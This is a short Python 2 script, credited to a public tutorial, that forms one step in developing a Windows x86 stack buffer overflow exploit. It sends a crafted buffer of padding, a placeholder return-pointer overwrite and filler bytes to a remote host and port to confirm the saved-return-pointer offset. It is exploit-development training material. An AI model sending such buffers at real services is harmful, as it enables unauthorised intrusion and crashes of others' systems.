#!/usr/bin/env python

# Used to confirm that the suspected offset is indeed correct. This is part of
# the process in developing a Windows x86 reverse shell stack buffer overflow
# Saved Return Pointer overwrite exploit.
# Parameters are saved in params.py for persistence.
# Delete params.py and params.pyc to reset them; or simply edit params.py
#
# Written by y0k3L
# Credit to Justin Steven and his 'dostackbufferoverflowgood' tutorial
# https://github.com/justinsteven/dostackbufferoverflowgood

import functions, os

# get parameters
RHOST = functions.getRhost()
RPORT = functions.getRport()
buf_totlen = functions.getBufTotlen()
offset_srp = functions.getOffsetSrp()

if offset_srp > buf_totlen-300:
    print "Warning: offset is close to max buffer length. Recommend increasing "
    print "max buffer length (buf_totlen)"

print "RHOST=%s; RPORT=%s; buf_totlen=%s; offset_srp=%s" % (RHOST, RPORT, buf_totlen, offset_srp)

buf = ""
buf += "A" * (offset_srp - len(buf))    # padding
buf += "BBBB"                           # SRP overwrite
buf += "CCCC"                           # ESP should end up pointing here
buf += "D" * (buf_totlen - len(buf))    # trailing padding
buf += "\n"

# print buf

sent = functions.sendBuffer(RHOST, RPORT, buf)

if sent is 0:
    print "Confirm that EBP is all 0x41's, EIP is all 0x42's, and ESP points "
    print "to four 0x43's followed by many 0x44's"
